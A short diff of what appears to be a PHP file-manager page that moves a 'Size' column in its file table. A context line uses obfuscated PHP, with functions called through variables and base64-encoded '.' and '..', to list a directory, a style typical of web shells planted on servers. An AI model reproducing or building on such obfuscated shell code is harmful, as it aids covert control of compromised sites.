@@ -659,9 +659,9 @@ Un:
 <thead class="text-light">
 <tr>
 <th style="width: 45%;">Name</th>
+<th style="width: 13%;">Size</th>
 <th style="width: 13%;">Permission</th>
 <th colspan="3">Action</th>
-<th style="width: 13%;">Size</th>
 </tr>
 </thead>
 <tbody class="text-light"> <?php $G3 = $c8[5]($G3($Jd), [base64_decode('Lg=='), base64_decode('Li4=')]);
